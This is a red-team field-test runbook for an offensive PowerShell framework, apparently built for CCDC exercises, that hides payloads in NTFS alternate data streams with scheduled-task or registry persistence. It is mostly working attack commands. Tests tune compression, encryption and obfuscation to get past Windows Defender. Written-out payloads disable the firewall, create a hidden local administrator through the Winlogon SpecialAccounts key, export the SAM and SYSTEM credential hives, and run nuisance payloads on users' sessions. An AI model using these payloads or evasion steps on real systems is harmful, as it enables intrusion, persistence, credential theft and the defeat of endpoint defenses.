# ADS v2.4 Field Test Runbook

**Purpose:** High-signal validation of ADS across critical features and real payloads.
**Environment:** Kali (generation) → Windows VM (deployment + execution).
**Open questions this tests:** BUG-015 (DeflateStream evasion), BUG-011 (-Encrypt), BUG-018 (ZeroWidth graceful failure), overall pipeline health.

---

## Reporting guidance (read before testing)

After running all tests, paste back a filled-in report template (bottom of this file). **Do NOT paste:**
- Full OneLiner banner/header output — only errors
- Full PowerShell stack traces — only the `At line:X` and exception message lines
- Full deployment output — only `[+]`, `[-]`, `[!]` status lines and any red errors

**DO paste in full:**
- Output of the Defender event check command (short, critical signal)
- Output of the task list check command (short, critical signal)
- Canary check output

---

## STEP 0: Environment capture

### Kali — verify version
```bash
cd /path/to/Apparition-Delivery-System-WithClaude-Snapshot6
grep "Version:" src/ADS-OneLiner.ps1 | head -3
# Should include: Version: 2.4
```

### Windows — run once, paste full output in report
```powershell
@{
    OS      = (Get-CimInstance Win32_OperatingSystem).Caption
    Build   = (Get-CimInstance Win32_OperatingSystem).BuildNumber
    EngineV = (Get-MpComputerStatus).AMEngineVersion
    SigV    = (Get-MpComputerStatus).AntivirusSignatureVersion
    RTP     = (Get-MpComputerStatus).RealTimeProtectionEnabled
    PS      = $PSVersionTable.PSVersion.ToString()
} | Format-Table -AutoSize
```

---

## Framework Tests

### T1: BASELINE — No compression, no encryption
**Tests:** Core pipeline end-to-end. If this fails, nothing else will work.

**Kali:**
```bash
pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -Payload 'New-Item \"\$env:TEMP\ads-t1-\$(Get-Random).txt\" -ItemType File -Force | Out-Null' \
    -Persist task \
    -Trigger AtLogOn \
    -Obfuscate None \
    -UseCompression \$false \
    -OutputFile /tmp/ads-t1-baseline.txt
" 2>&1 | grep -E "^\[|Error|Exception|FAIL|✓|❌"
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-t1-baseline.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste `/tmp/ads-t1-baseline.txt`, then:
```powershell
# Get task name from output, fire it manually
$t = Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" } | Select-Object -Last 1
if ($t) { Start-ScheduledTask $t.TaskName; Start-Sleep 5 }
Get-ChildItem $env:TEMP | Where-Object Name -like "ads-t1-*" | Select-Object Name, LastWriteTime
```
**Pass:** Canary file found in `$env:TEMP`. Defender silent.

---

### T2: COMPRESSION — DeflateStream evasion (BUG-015 CRITICAL)
**Tests:** Core Session 6 work. Must pass before v2.4 merges to main.

**Kali:**
```bash
pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -Payload 'New-Item \"\$env:TEMP\ads-t2-\$(Get-Random).txt\" -ItemType File -Force | Out-Null' \
    -Persist task \
    -Trigger AtLogOn \
    -Obfuscate None \
    -UseCompression \$true \
    -OutputFile /tmp/ads-t2-compress.txt
" 2>&1 | grep -E "^\[|Error|Exception|FAIL|✓|❌"
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-t2-compress.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste `/tmp/ads-t2-compress.txt`. Watch Defender tray icon during paste. Then:
```powershell
$t = Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" } | Select-Object -Last 1
if ($t) { Start-ScheduledTask $t.TaskName; Start-Sleep 5 }
Get-ChildItem $env:TEMP | Where-Object Name -like "ads-t2-*" | Select-Object Name, LastWriteTime
```
**Pass:** Defender CLEAN during paste AND during task execution. Canary found.
**If Defender fires:** Record exact detection name (from tray or Event 1116). Note whether it fired on paste or on task execution.

---

### T3: ENCRYPT — BUG-011 status check
**Tests:** Whether `-Encrypt` still triggers Defender Trojan detection.
**Note:** Queue ran an encrypted payload successfully last session — this confirms whether that was `-Encrypt` (AES) or compression-only.

**Kali:**
```bash
pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -Payload 'New-Item \"\$env:TEMP\ads-t3-\$(Get-Random).txt\" -ItemType File -Force | Out-Null' \
    -Encrypt \
    -Persist task \
    -Trigger AtLogOn \
    -UseCompression \$false \
    -OutputFile /tmp/ads-t3-encrypt.txt
" 2>&1 | grep -E "^\[|Error|Exception|FAIL|✓|❌"
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-t3-encrypt.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste `/tmp/ads-t3-encrypt.txt`. Observe Defender response. Then:
```powershell
$t = Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" } | Select-Object -Last 1
if ($t) { Start-ScheduledTask $t.TaskName; Start-Sleep 5 }
Get-ChildItem $env:TEMP | Where-Object Name -like "ads-t3-*" | Select-Object Name, LastWriteTime
```
**Pass (BUG-011 RESOLVED):** Defender clean + canary found.
**Expected (BUG-011 unresolved):** Defender fires with Trojan detection on paste. Note exact detection name.

---

### T4: OBFUSCATION TIERS — Generation only
**Tests:** All 4 tiers generate without script errors. No Windows step needed.

**Kali:**
```bash
for tier in None Basic Advanced Paranoid; do
  pwsh -NoProfile -Command "
    ./src/ADS-OneLiner.ps1 \
      -Payload 'Write-Host ok' \
      -Persist task \
      -Trigger AtLogOn \
      -Obfuscate $tier \
      -UseCompression \$false \
      -OutputFile /tmp/ads-t4-$tier.txt
  " 2>&1 | grep -E "Error|Exception|FAIL|✓"
  echo "[$tier] EXIT=$? SIZE=$(wc -c < /tmp/ads-t4-$tier.txt 2>/dev/null || echo 0)b"
done
```
**Pass:** All 4 tiers EXIT=0, all files > 500 bytes.

---

### T5: ZEROWIDTH + REGISTRY — BUG-018 reproduction
**Tests:** Whether ZeroWidth stream names + registry persistence fails gracefully or silently.
**Note:** Queue observed silent failure during manual testing. This reproduces it.

**Kali:**
```bash
pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -Payload 'New-Item \"\$env:TEMP\ads-t5-\$(Get-Random).txt\" -ItemType File -Force | Out-Null' \
    -Persist registry \
    -Obfuscate Advanced \
    -UseCompression \$false \
    -OutputFile /tmp/ads-t5-zw-reg.txt
" 2>&1
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-t5-zw-reg.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste `/tmp/ads-t5-zw-reg.txt`. Then:
```powershell
# Check registry Run key for new entries
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -EA 0 |
    Select-Object * -ExcludeProperty PS* | Format-List
```
**Pass (graceful):** Clear warning or error emitted — operator knows it failed.
**Bug confirmed:** Silent completion with no entry in registry and no warning.
**Report:** All output from Kali generation AND last 10 lines from Windows paste.

---

### T6: MULTI-INSTANCE — 3 tasks created
**Tests:** InstanceCount > 1 creates the correct number of tasks.

**Kali:**
```bash
pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -Payload 'New-Item \"\$env:TEMP\ads-t6-\$(Get-Random).txt\" -ItemType File -Force | Out-Null' \
    -Persist task \
    -Trigger AtLogOn \
    -InstanceCount 3 \
    -Obfuscate Basic \
    -UseCompression \$false \
    -OutputFile /tmp/ads-t6-multi.txt
" 2>&1 | grep -E "^\[|Error|Exception|FAIL|✓|❌"
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-t6-multi.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste `/tmp/ads-t6-multi.txt`. Then:
```powershell
$tasks = Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" -and $_.TaskPath -notlike "\MicrosoftEdge*" }
$tasks | Select-Object TaskName, State | Format-Table
"Task count: $($tasks.Count)"
```
**Pass:** 3+ new tasks appear.

---

### T7: DEEP PLACEMENT — Denylist + fallback
**Tests:** BUG-016 fix — no locked file selection, ADS verified before success declared.

**Kali:**
```bash
pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -Payload 'New-Item \"\$env:TEMP\ads-t7-\$(Get-Random).txt\" -ItemType File -Force | Out-Null' \
    -Persist task \
    -Trigger AtLogOn \
    -UseDeepPlacement \$true \
    -UseCompression \$false \
    -OutputFile /tmp/ads-t7-deep.txt
" 2>&1 | grep -E "^\[|Error|Exception|FAIL|✓|❌"
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-t7-deep.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste `/tmp/ads-t7-deep.txt`. Report the `[+] ADS written to:` line from the output.
**Pass:** Deployment succeeds (prints ADS path, not an error). ADS path is NOT qmgr.db or a .edb file.

---

## Red Team TTP Tests

### T8: FIREWALL DISABLE — Recurring task
**TTP:** T1562.004 — Impair Defenses: Disable or Modify System Firewall

**Kali:**
```bash
pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -Payload 'netsh advfirewall set allprofiles state off' \
    -Persist task \
    -Trigger AtLogOn \
    -Obfuscate Basic \
    -UseCompression \$false \
    -OutputFile /tmp/ads-t8-fw.txt
" 2>&1 | grep -E "^\[|Error|Exception|FAIL|✓|❌"
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-t8-fw.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste. Fire manually, then verify:
```powershell
$t = Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" } | Select-Object -Last 1
if ($t) { Start-ScheduledTask $t.TaskName; Start-Sleep 5 }
netsh advfirewall show allprofiles state | Select-String "State"
```
**Pass:** All profiles show `State OFF`. Defender clean.
**Cleanup:** `netsh advfirewall set allprofiles state on`

---

### T9: HIDDEN ADMIN — Registry-concealed local account
**TTP:** T1136.001 — Create Account: Local Account + T1564.002 — Hidden Users

**Kali:**
```bash
cat > /tmp/payload-t9.ps1 << 'PSEOF'
$u='svc_upd'; $p='P@ssw0rd1!'
net user $u $p /add 2>$null
net localgroup administrators $u /add 2>$null
$k='HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
if(!(Test-Path $k)){New-Item $k -Force|Out-Null}
Set-ItemProperty $k $u 0 -Type DWord -Force 2>$null
New-Item "$env:TEMP\ads-t9-ok.txt" -Force | Out-Null
PSEOF

pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -PayloadFile /tmp/payload-t9.ps1 \
    -Persist task \
    -Trigger AtLogOn \
    -Obfuscate Basic \
    -UseCompression \$false \
    -OutputFile /tmp/ads-t9-admin.txt
" 2>&1 | grep -E "^\[|Error|Exception|FAIL|✓|❌"
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-t9-admin.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste. Fire, then verify:
```powershell
$t = Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" } | Select-Object -Last 1
if ($t) { Start-ScheduledTask $t.TaskName; Start-Sleep 5 }
net user svc_upd 2>$null; Get-ChildItem "$env:TEMP\ads-t9-ok.txt" -EA 0
```
**Pass:** `net user svc_upd` shows the account. Canary found. Account hidden from login screen.
**Cleanup:** `net user svc_upd /delete`

---

### T10: CREDENTIAL DUMP — SAM/SYSTEM registry hive export
**TTP:** T1003.002 — OS Credential Dumping: Security Account Manager
**Note:** Requires SYSTEM context. Task scheduler runs as SYSTEM by default.

**Kali:**
```bash
cat > /tmp/payload-t10.ps1 << 'PSEOF'
$t = "$env:TEMP"
reg save HKLM\SAM "$t\ads-sam.hiv" /y 2>$null
reg save HKLM\SYSTEM "$t\ads-sys.hiv" /y 2>$null
if(Test-Path "$t\ads-sam.hiv"){ New-Item "$t\ads-t10-ok.txt" -Force | Out-Null }
PSEOF

pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -PayloadFile /tmp/payload-t10.ps1 \
    -Persist task \
    -Trigger AtLogOn \
    -Obfuscate Advanced \
    -UseCompression \$false \
    -OutputFile /tmp/ads-t10-sam.txt
" 2>&1 | grep -E "^\[|Error|Exception|FAIL|✓|❌"
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-t10-sam.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste. Fire, then verify:
```powershell
$t = Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" } | Select-Object -Last 1
if ($t) { Start-ScheduledTask $t.TaskName; Start-Sleep 5 }
Get-ChildItem "$env:TEMP\ads-sam.hiv","$env:TEMP\ads-t10-ok.txt" -EA 0 | Select-Object Name, Length
```
**Pass:** `ads-sam.hiv` exists with size > 0. Canary found.
**Cleanup:** `Remove-Item "$env:TEMP\ads-sam.hiv","$env:TEMP\ads-sys.hiv" -Force -EA 0`

---

### T11: COMPRESS + ENCRYPT + PARANOID OBFUSCATE — Full operational stack
**Tests:** All evasion layers active together. Real-world deployment posture.

**Kali:**
```bash
pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -Payload 'New-Item \"\$env:TEMP\ads-t11-\$(Get-Random).txt\" -ItemType File -Force | Out-Null' \
    -Encrypt \
    -UseCompression \$true \
    -Persist task \
    -Trigger AtLogOn \
    -Obfuscate Paranoid \
    -Randomize \$true \
    -OutputFile /tmp/ads-t11-full.txt
" 2>&1 | grep -E "^\[|Error|Exception|FAIL|✓|❌"
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-t11-full.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste `/tmp/ads-t11-full.txt`. Watch Defender carefully. Fire, then:
```powershell
$t = Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" } | Select-Object -Last 1
if ($t) { Start-ScheduledTask $t.TaskName; Start-Sleep 5 }
Get-ChildItem $env:TEMP | Where-Object Name -like "ads-t11-*" | Select-Object Name, LastWriteTime
```
**Pass:** Defender clean at all stages. Canary found.
**Note:** If this fires Defender, note exactly which stage (paste, task registration, task execution).

---

## Meme Payload Tests

### M1: CLIPBOARD RICKROLL — MEME-006 (SYSTEM OK, time-limited)
**Tests:** SYSTEM-context clipboard access. Validates SYSTEM can reach user clipboard.

**Kali:**
```bash
cat > /tmp/payload-m1.ps1 << 'PSEOF'
$end = (Get-Date).AddMinutes(2)
while((Get-Date) -lt $end){
    Set-Clipboard "Never gonna give you up - Red Team <3 CCDC 2026"
    Start-Sleep -Seconds 15
}
PSEOF

pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -PayloadFile /tmp/payload-m1.ps1 \
    -Persist task \
    -Trigger AtLogOn \
    -UseCompression \$false \
    -OutputFile /tmp/ads-m1-clipboard.txt
" 2>&1 | grep -E "^\[|Error|Exception"
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-m1-clipboard.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste. Fire task. Open Notepad and press Ctrl+V.
**Pass:** Clipboard contains rickroll text. **Fail note:** If clipboard is empty, SYSTEM cannot reach user clipboard on this session configuration — report which Windows build.

---

### M2: CAPS LOCK DISCO — MEME-005 (SYSTEM → keyboard test, time-limited)
**Tests:** Whether WScript.Shell SendKeys from SYSTEM reaches the active user session keyboard.

**Kali:**
```bash
cat > /tmp/payload-m2.ps1 << 'PSEOF'
$wsh = New-Object -ComObject WScript.Shell
$end = (Get-Date).AddSeconds(60)
while((Get-Date) -lt $end){
    $wsh.SendKeys('{CAPSLOCK}'); Start-Sleep -Milliseconds 400
    $wsh.SendKeys('{NUMLOCK}'); Start-Sleep -Milliseconds 400
    $wsh.SendKeys('{SCROLLLOCK}'); Start-Sleep -Milliseconds 400
}
PSEOF

pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -PayloadFile /tmp/payload-m2.ps1 \
    -Persist task \
    -Trigger AtLogOn \
    -UseCompression \$false \
    -OutputFile /tmp/ads-m2-disco.txt
" 2>&1 | grep -E "^\[|Error|Exception"
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-m2-disco.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste. Fire task. Watch keyboard indicator LEDs for 60 seconds.
**Pass:** LEDs blink in sequence. **Fail note:** If nothing happens, SendKeys from Session 0 cannot cross session boundary on this build — report which Windows build.

---

### M3: MATRIX RAIN — MEME-004 (Spawns console window)
**Tests:** Whether a SYSTEM task can spawn a visible console window on the user desktop.

**Kali:**
```bash
cat > /tmp/payload-m3.ps1 << 'PSEOF'
$script = @'
$host.UI.RawUI.BackgroundColor="Black"; $host.UI.RawUI.ForegroundColor="Green"; Clear-Host
$w=$host.UI.RawUI.WindowSize.Width; $drops=@{}
$chars="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%^&*()"
$end=[DateTime]::Now.AddMinutes(2)
while([DateTime]::Now -lt $end){
    $col=Get-Random -Maximum $w; $drops[$col]=0
    foreach($c in @($drops.Keys)){
        $y=$drops[$c]
        if($y -lt $host.UI.RawUI.WindowSize.Height){
            $host.UI.RawUI.CursorPosition=New-Object System.Management.Automation.Host.Coordinates($c,$y)
            Write-Host $chars[(Get-Random -Maximum $chars.Length)] -NoNewline -ForegroundColor Green
            $drops[$c]++
        } else { $drops.Remove($c) }
    }
    Start-Sleep -Milliseconds 50
}
'@
$f="$env:ProgramData\sysmon_diag.ps1"; $script | Out-File $f -Force
Start-Process powershell -ArgumentList "-NoProfile -File `"$f`"" -WindowStyle Normal
PSEOF

pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -PayloadFile /tmp/payload-m3.ps1 \
    -Persist task \
    -Trigger AtLogOn \
    -UseCompression \$false \
    -OutputFile /tmp/ads-m3-matrix.txt
" 2>&1 | grep -E "^\[|Error|Exception"
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-m3-matrix.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste. Fire task manually. Check if green console window appears.
**Pass:** Matrix rain window appears on desktop. **Fail note:** Window may not cross from Session 0 to Session 1. If invisible, report the session configuration.
**Cleanup:** `Remove-Item "$env:ProgramData\sysmon_diag.ps1" -Force -EA 0`

---

### M4: NOTEPAD FLOOD — MEME-002 (AtLogOn — interactive session required)
**Tests:** Interactive-session payload delivery via AtLogOn trigger. 10 notepads cascade.

**Kali:**
```bash
cat > /tmp/payload-m4.ps1 << 'PSEOF'
$msg = "      _     `n     (o>    `n     //\    `n    V_/_    `n`nRed Team Was Here`nCCDC 2026"
1..10 | ForEach-Object {
    $f = "$env:TEMP\rt_$_.txt"; $msg | Out-File $f -Force
    Start-Process notepad $f; Start-Sleep -Milliseconds 200
}
PSEOF

pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -PayloadFile /tmp/payload-m4.ps1 \
    -Persist task \
    -Trigger AtLogOn \
    -UseCompression \$false \
    -OutputFile /tmp/ads-m4-notepads.txt
" 2>&1 | grep -E "^\[|Error|Exception"
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-m4-notepads.txt 2>/dev/null || echo 0)b"
```

**Windows:** Paste. Log off and log back on (AtLogOn trigger — cannot fire manually from SYSTEM for interactive payloads).
**Pass:** 10 notepads cascade on login. **Note:** Reduced from 50 — scale up for real deployment.
**Cleanup:** Close notepads. `Remove-Item "$env:TEMP\rt_*.txt" -Force -EA 0`

---

## Post-Test State Checks (Windows)

Run these once after all tests. Paste full output in report.

```powershell
# 1. Defender detections from last 2 hours (THE most important signal)
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -MaxEvents 50 -EA 0 |
    Where-Object { $_.Id -in @(1116,1117) -and $_.TimeCreated -gt (Get-Date).AddHours(-2) } |
    Select-Object TimeCreated, @{n='Detection';e={$_.Properties[0].Value}} |
    Format-Table -AutoSize
# Print "CLEAN" if no output

# 2. All non-Microsoft scheduled tasks created during testing
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" -and $_.TaskPath -notlike "\MicrosoftEdge*" } |
    Select-Object TaskName, TaskPath, State | Format-Table -AutoSize

# 3. Canary files in TEMP
Get-ChildItem $env:TEMP | Where-Object { $_.Name -like "ads-*" -or $_.Name -like "rt_*" } |
    Select-Object Name, LastWriteTime | Format-Table -AutoSize
```

---

## Cleanup (Windows)

```powershell
# 1. Remove all non-Microsoft tasks (review list from check #2 first!)
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" -and $_.TaskPath -notlike "\MicrosoftEdge*" } |
    ForEach-Object { Unregister-ScheduledTask $_.TaskName -Confirm:$false }

# 2. Remove HKCU Run entries added by tests
# (Review Get-ItemProperty HKCU:\...\Run output first, remove only test entries)

# 3. Remove temp and payload files
Remove-Item "$env:TEMP\ads-*" -Force -EA 0
Remove-Item "$env:TEMP\rt_*" -Force -EA 0
Remove-Item "$env:ProgramData\sysmon_diag.ps1" -Force -EA 0

# 4. Restore defenses disabled by T8/T11 (if they ran)
netsh advfirewall set allprofiles state on
Set-MpPreference -DisableRealtimeMonitoring $false

# 5. Remove test admin if T9 ran
net user svc_upd /delete 2>$null
```

---

## Report Template

Fill in and paste back. Use `OK`/`FAIL` and `CLEAN`/`FIRED:[name]`.

```
FIELD TEST RESULTS
Date:
Windows:         [e.g., Windows 11 23H2 Build 22631]
Defender Engine: [from Step 0]
Defender Sigs:   [from Step 0]
PS Version:      [5.1 or 7.x]
RTP Active:      [Yes/No]

--- KALI GENERATION ---  format: EXIT=0/1  SIZE=Xb  ERR=[none or first error line]
T1  BASELINE:          EXIT=  SIZE=  ERR=
T2  COMPRESS:          EXIT=  SIZE=  ERR=
T3  ENCRYPT:           EXIT=  SIZE=  ERR=
T4  OBFUSCATE TIERS:   None=  Basic=  Advanced=  Paranoid=   (OK or FAIL)
T5  ZW+REGISTRY:       EXIT=  SIZE=  ERR=
T6  MULTI (x3):        EXIT=  SIZE=  ERR=
T7  DEEP:              EXIT=  SIZE=  ERR=
T8  FIREWALL:          EXIT=  SIZE=  ERR=
T9  ADMIN:             EXIT=  SIZE=  ERR=
T10 SAM DUMP:          EXIT=  SIZE=  ERR=
T11 FULL STACK:        EXIT=  SIZE=  ERR=
M1  CLIPBOARD:         EXIT=  SIZE=  ERR=
M2  DISCO:             EXIT=  SIZE=  ERR=
M3  MATRIX:            EXIT=  SIZE=  ERR=
M4  NOTEPADS:          EXIT=  SIZE=  ERR=

--- WINDOWS DEPLOYMENT ---  format: DEPLOY=OK/FAIL  DEFENDER=CLEAN/FIRED:[name]  CANARY=FOUND/MISSING
T1  BASELINE:    DEPLOY=  DEFENDER=  CANARY=
T2  COMPRESS:    DEPLOY=  DEFENDER=  CANARY=         <- Most important result
T3  ENCRYPT:     DEPLOY=  DEFENDER=  CANARY=         <- BUG-011 status
T5  ZW+REGISTRY: DEPLOY=  DEFENDER=  REGISTRY_ENTRY=PRESENT/MISSING  WARNED=YES/NO
T6  MULTI:       DEPLOY=  DEFENDER=  TASK_COUNT=
T7  DEEP:        DEPLOY=  DEFENDER=  ADS_PATH=[paste the reported path]
T8  FIREWALL:    DEPLOY=  DEFENDER=  FW_DISABLED=YES/NO
T9  ADMIN:       DEPLOY=  DEFENDER=  USER_CREATED=YES/NO
T10 SAM DUMP:    DEPLOY=  DEFENDER=  SAM_HIV_SIZE=[bytes or MISSING]
T11 FULL STACK:  DEPLOY=  DEFENDER=  CANARY=         <- Fired at which stage?

--- MEME RESULTS ---
M1  CLIPBOARD:   DEPLOY=  DEFENDER=  EFFECT=[rickroll appeared / empty clipboard]
M2  DISCO:       DEPLOY=  DEFENDER=  EFFECT=[LEDs blinked / nothing]
M3  MATRIX:      DEPLOY=  DEFENDER=  EFFECT=[window visible / nothing]
M4  NOTEPADS:    DEPLOY=  DEFENDER=  EFFECT=[N notepads appeared / nothing]

--- DEFENDER EVENTS (paste full output of check #1, or write CLEAN) ---


--- TASK LIST (paste full output of check #2) ---


--- ERRORS (paste any error lines not captured above, one per test ID) ---


--- NOTES (unusual behavior, unexpected results, observations) ---
```
